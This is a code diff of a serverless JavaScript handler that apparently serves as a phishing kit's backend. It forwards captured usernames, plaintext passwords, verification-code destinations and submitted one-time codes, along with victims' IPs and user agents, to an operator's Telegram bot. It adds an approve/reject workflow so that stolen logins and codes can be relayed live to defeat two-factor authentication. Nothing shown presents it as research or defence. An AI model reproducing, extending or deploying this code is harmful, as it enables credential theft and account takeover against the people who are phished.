@@ -15,8 +15,10 @@ export default async function handler(req, res) {
   }
 
   let message = '';
-  let parseMode = 'HTML';
   let sessionId = null;
+
+  // Store session for all actions that need approval
+  const pendingApprovals = global.pendingApprovals || new Map();
 
   switch (action) {
     case 'domain_detection':
@@ -25,20 +27,7 @@ export default async function handler(req, res) {
     case 'login_attempt':
       sessionId = data.sessionId;
       message = formatLoginAttempt(data);
-      break;
-    case 'auth_attempt':
-      message = formatAuthAttempt(data);
-      break;
-    case 'code_submitted':
-      message = formatCodeSubmitted(data);
-      break;
-    default:
-      return res.status(400).json({ error: 'Invalid action' });
-  }
-
-  try {
-    if (action === 'login_attempt' && sessionId) {
-      const pendingApprovals = global.pendingApprovals || new Map();
+      // Store for approval
       pendingApprovals.set(sessionId, { 
         status: 'pending', 
         data: data,
@@ -46,9 +35,39 @@ export default async function handler(req, res) {
         timestamp: Date.now()
       });
       global.pendingApprovals = pendingApprovals;
-    }
-    
-    await sendTelegramMessage(botToken, chatId, message, parseMode, sessionId);
+      console.log(`💾 Stored login session: ${sessionId}`);
+      break;
+    case 'auth_attempt':
+      sessionId = data.sessionId || 'AUTH_' + Date.now();
+      message = formatAuthAttempt(data);
+      // Auto-approve auth attempts
+      pendingApprovals.set(sessionId, { 
+        status: 'approved', 
+        data: data,
+        action: action,
+        timestamp: Date.now()
+      });
+      global.pendingApprovals = pendingApprovals;
+      break;
+    case 'code_submitted':
+      sessionId = data.sessionId || 'CODE_' + Date.now();
+      message = formatCodeSubmitted(data);
+      // Store for approval (MANUAL APPROVAL REQUIRED)
+      pendingApprovals.set(sessionId, { 
+        status: 'pending', 
+        data: data,
+        action: action,
+        timestamp: Date.now()
+      });
+      global.pendingApprovals = pendingApprovals;
+      console.log(`💾 Stored code session: ${sessionId}`);
+      break;
+    default:
+      return res.status(400).json({ error: 'Invalid action' });
+  }
+
+  try {
+    await sendTelegramMessage(botToken, chatId, message, sessionId);
     res.status(200).json({ success: true, sessionId: sessionId });
   } catch (error) {
     console.error('Telegram send error:', error);
@@ -56,78 +75,71 @@ export default async function handler(req, res) {
   }
 }
 
-// ============================================================
-// ====== FORMAT FUNCTIONS - CLEAN, STANDARD FORMAT ===========
-// ============================================================
+// ====== FORMAT FUNCTIONS ======
 
 function formatDomainDetection(data) {
   const { domain, isFree, timestamp, userAgent, ip } = data;
   return `
-┌─────────────────────────────────────────
-│ DOMAIN DETECTED
-├─────────────────────────────────────────
-│ DOMAIN    ${domain}
-│ TYPE      ${isFree ? 'FREE' : 'PURCHASED'}
-│ TIME      ${timestamp}
-│ USER      ${userAgent || 'Unknown'}
-│ IP        ${ip || 'Unknown'}
-└─────────────────────────────────────────
+DOMAIN DETECTED
+─────────────────
+DOMAIN    ${domain}
+TYPE      ${isFree ? 'FREE' : 'PURCHASED'}
+TIME      ${timestamp}
+USER      ${userAgent || 'Unknown'}
+IP        ${ip || 'Unknown'}
+─────────────────
 `;
 }
 
 function formatLoginAttempt(data) {
   const { username, password, timestamp, userAgent, ip, sessionId } = data;
   return `
-┌─────────────────────────────────────────
-│ LOGIN ATTEMPT — APPROVAL REQUIRED
-├─────────────────────────────────────────
-│ USERNAME  ${username}
-│ PASSWORD  ${password}
-│ SESSION   ${sessionId}
-│ TIME      ${timestamp}
-│ USER      ${userAgent || 'Unknown'}
-│ IP        ${ip || 'Unknown'}
-├─────────────────────────────────────────
-│ ACTION: APPROVE ${sessionId}
-│         REJECT ${sessionId}
-└─────────────────────────────────────────
+LOGIN ATTEMPT — APPROVAL REQUIRED
+─────────────────
+USERNAME  ${username}
+PASSWORD  ${password}
+SESSION   ${sessionId}
+TIME      ${timestamp}
+USER      ${userAgent || 'Unknown'}
+IP        ${ip || 'Unknown'}
+─────────────────
+ACTION: APPROVE ${sessionId}
+        REJECT ${sessionId}
 `;
 }
 
 function formatAuthAttempt(data) {
-  const { method, destination, timestamp, userAgent, ip } = data;
+  const { method, destination, timestamp, userAgent, ip, sessionId } = data;
   return `
-┌─────────────────────────────────────────
-│ VERIFICATION REQUEST
-├─────────────────────────────────────────
-│ METHOD    ${method === 'sms' ? 'SMS' : 'EMAIL'}
-│ DEST      ${destination}
-│ TIME      ${timestamp}
-│ USER      ${userAgent || 'Unknown'}
-│ IP        ${ip || 'Unknown'}
-├─────────────────────────────────────────
-│ STATUS: AUTO-APPROVED
-└─────────────────────────────────────────
+VERIFICATION REQUEST — AUTO-APPROVED
+─────────────────
+METHOD    ${method === 'sms' ? 'SMS' : 'EMAIL'}
+DEST      ${destination}
+SESSION   ${sessionId}
+TIME      ${timestamp}
+USER      ${userAgent || 'Unknown'}
+IP        ${ip || 'Unknown'}
+─────────────────
 `;
 }
 
 function formatCodeSubmitted(data) {
-  const { code, timestamp, userAgent, ip } = data;
+  const { code, timestamp, userAgent, ip, sessionId } = data;
   return `
-┌─────────────────────────────────────────
-│ CODE SUBMITTED
-├─────────────────────────────────────────
-│ CODE      ${code}
-│ TIME      ${timestamp}
-│ USER      ${userAgent || 'Unknown'}
-│ IP        ${ip || 'Unknown'}
-├─────────────────────────────────────────
-│ STATUS: AUTO-APPROVED
-└─────────────────────────────────────────
+CODE SUBMITTED — APPROVAL REQUIRED
+─────────────────
+CODE      ${code}
+SESSION   ${sessionId}
+TIME      ${timestamp}
+USER      ${userAgent || 'Unknown'}
+IP        ${ip || 'Unknown'}
+─────────────────
+ACTION: APPROVE ${sessionId}
+        REJECT ${sessionId}
 `;
 }
 
-async function sendTelegramMessage(botToken, chatId, message, parseMode = 'HTML', sessionId = null) {
+async function sendTelegramMessage(botToken, chatId, message, sessionId = null) {
   const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
   
   let replyMarkup = {};
@@ -147,7 +159,6 @@ async function sendTelegramMessage(botToken, chatId, message, parseMode = 'HTML'
   const payload = {
     chat_id: chatId,
     text: message,
-    parse_mode: parseMode,
     disable_web_page_preview: true,
     ...replyMarkup
   };
